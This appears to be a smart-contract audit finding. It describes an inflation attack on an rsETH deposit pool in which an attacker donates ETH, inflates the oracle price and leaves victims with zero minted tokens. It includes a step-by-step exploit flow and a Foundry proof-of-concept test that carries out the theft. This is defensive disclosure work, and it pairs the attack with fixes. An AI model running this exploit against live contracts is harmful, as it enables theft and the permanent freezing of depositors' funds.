Audit Report

## Title
rsETH Inflation Attack via ETH Donation Inflates `rsETHPrice`, Causing Victim Depositors to Receive Zero rsETH — (File: `contracts/LRTDepositPool.sol`, `contracts/LRTOracle.sol`)

## Summary

An unprivileged attacker can donate ETH directly to `LRTDepositPool` via its unrestricted `receive()` function, then call the public `updateRSETHPrice()` to inflate `rsETHPrice` to an arbitrarily large value. Because the rsETH minting formula uses integer floor division with no zero-output guard, a victim depositing with `minRSETHAmountExpected = 0` receives zero rsETH while their ETH is permanently locked in the contract. Since all withdrawal paths require the caller to hold rsETH, the victim has no recovery mechanism.

## Finding Description

**Root cause 1 — unrestricted ETH donation inflates `address(this).balance`**

`LRTDepositPool` exposes an unrestricted `receive()`: [1](#0-0) 

`getETHDistributionData()` counts the raw contract balance as protocol TVL: [2](#0-1) 

Any address can therefore inflate `totalETHInProtocol` by sending ETH directly to the contract.

**Root cause 2 — `updateRSETHPrice()` is public with no price-increase guard when `pricePercentageLimit == 0`**

`updateRSETHPrice()` is callable by anyone: [3](#0-2) 

The price-increase guard is gated on `pricePercentageLimit > 0`: [4](#0-3) 

`pricePercentageLimit` is never set in `initialize()`, so it defaults to `0`: [5](#0-4) 

This leaves the price update completely unrestricted for any caller on a freshly deployed instance.

**Root cause 3 — minting formula uses floor division with no zero-output guard**

`getRsETHAmountToMint()` computes: [6](#0-5) 

If `rsETHPrice` is inflated sufficiently, `rsethAmountToMint` floors to `0`. `_beforeDeposit` only reverts when `rsethAmountToMint < minRSETHAmountExpected`: [7](#0-6) 

When `minRSETHAmountExpected = 0`, the check `0 < 0` is `false`, so the deposit proceeds. The victim's ETH (already received as `msg.value` before the check) is permanently locked in the contract with no rsETH minted to claim it back.

**Exploit flow (preconditions: `pricePercentageLimit == 0`, `minAmountToDeposit == 0`, `protocolFeeInBPS == 0`, ETH supported, `rsETHPrice` initialized to `1e18`)**

1. Attacker calls `depositETH{value: 1}(0, "")` → receives 1 wei rsETH (`1 * 1e18 / 1e18 = 1`).
2. Attacker sends `D = 100 ether` directly to `LRTDepositPool` via `receive()`.
3. Attacker calls `lrtOracle.updateRSETHPrice()`:
   - `rsethSupply = 1`, `totalETHInProtocol ≈ 100e18 + 1`
   - `newRsETHPrice = (100e18 + 1) * 1e18 / 1 ≈ 100e36`
   - No revert because `pricePercentageLimit == 0`.
4. Victim calls `depositETH{value: 1 ether}(0, "")`:
   - `rsethAmountToMint = (1e18 * 1e18) / 100e36 = 0` (floors to zero)
   - `0 < 0` is false → no revert → victim receives **0 rsETH**, 1 ETH permanently locked.
5. Attacker calls `updateRSETHPrice()` again: `rsethSupply = 1`, `totalETHInProtocol ≈ 101 ether + 1`, `newRsETHPrice ≈ 101e36`.
6. Attacker initiates withdrawal of their 1 wei rsETH: `expectedAssetAmount = 1 * 101e36 / 1e18 ≈ 101 ether`, recovering their 100 ETH donation plus the victim's 1 ETH.

## Impact Explanation

The victim deposits ETH and receives 0 rsETH. All withdrawal paths (`initiateWithdrawal`, `instantWithdrawal`) require the caller to hold rsETH. The victim has no mechanism to recover their ETH. This constitutes **permanent freezing of user funds** (Critical) and, via the attacker's inflated-price withdrawal, **direct theft of user funds** (Critical).

## Likelihood Explanation

All three enabling conditions (`pricePercentageLimit == 0`, `minAmountToDeposit == 0`, `protocolFeeInBPS == 0`) are default values not set in any `initialize()` function, making the attack immediately executable on any freshly deployed or not-yet-configured instance. The attack is executable atomically in a single block. Many integrations and UI front-ends pass `minRSETHAmountExpected = 0` to avoid reverts. The attacker's capital (the donation `D`) is fully recovered after the attack. Likelihood: **Medium** (conditional on default configuration remaining unmodified and victim using zero slippage).

## Recommendation

1. **Revert on zero rsETH minted**: In `_beforeDeposit` (`LRTDepositPool.sol`), add `if (rsethAmountToMint == 0) revert ZeroRsETHMinted();` after computing `rsethAmountToMint`.
2. **Set `pricePercentageLimit` in `initialize()`**: A non-zero default (e.g., 1% = `1e16`) prevents a single call from inflating the price by an arbitrary factor.
3. **Restrict `receive()` or exclude untracked ETH from TVL**: Do not count raw `address(this).balance` as protocol TVL, or restrict ETH entry to named functions only (e.g., `receiveFromNodeDelegator`, `receiveFromRewardReceiver`).
4. **Virtual offset**: Add a virtual offset to rsETH supply and ETH TVL in the price calculation to make large-scale manipulation economically infeasible.

## Proof of Concept

**Foundry test plan:**

```solidity
function test_inflationAttack_victimReceivesZeroRsETH() public {
    // Preconditions: pricePercentageLimit == 0 (default), minAmountToDeposit == 0 (default),
    // protocolFeeInBPS == 0 (default), ETH supported, rsETHPrice initialized to 1e18.

    // Step 1: Attacker seeds pool with 1 wei ETH
    vm.prank(attacker);
    depositPool.depositETH{value: 1}(0, "");
    assertEq(rsETH.balanceOf(attacker), 1);

    // Step 2: Attacker donates 100 ETH directly
    vm.prank(attacker);
    (bool ok,) = address(depositPool).call{value: 100 ether}("");
    assertTrue(ok);

    // Step 3: Attacker inflates rsETHPrice
    vm.prank(attacker);
    lrtOracle.updateRSETHPrice();
    assertGt(lrtOracle.rsETHPrice(), 1e18);

    // Step 4: Victim deposits 1 ETH with zero slippage
    uint256 victimBalanceBefore = rsETH.balanceOf(victim);
    vm.prank(victim);
    depositPool.depositETH{value: 1 ether}(0, "");
    // Victim receives 0 rsETH — funds permanently frozen
    assertEq(rsETH.balanceOf(victim), victimBalanceBefore); // == 0

    // Step 5: Attacker updates price to include victim's ETH
    vm.prank(attacker);
    lrtOracle.updateRSETHPrice();

    // Step 6: Attacker withdraws 1 wei rsETH for ~101 ETH
    vm.prank(attacker);
    withdrawalManager.initiateWithdrawal(LRTConstants.ETH_TOKEN, 1, "");
    // After delay, attacker completes withdrawal and recovers ~101 ETH
}
```

### Citations

**File:** contracts/LRTDepositPool.sol (L58-58)
```text
    receive() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L519-520)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**File:** contracts/LRTDepositPool.sol (L667-669)
```text
        if (rsethAmountToMint < minRSETHAmountExpected) {
            revert MinimumAmountToReceiveNotMet();
        }
```

**File:** contracts/LRTOracle.sol (L64-68)
```text
    function initialize(address lrtConfigAddr) external initializer {
        UtilLib.checkNonZeroAddress(lrtConfigAddr);
        lrtConfig = ILRTConfig(lrtConfigAddr);
        emit UpdatedLRTConfig(lrtConfigAddr);
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L256-257)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
```
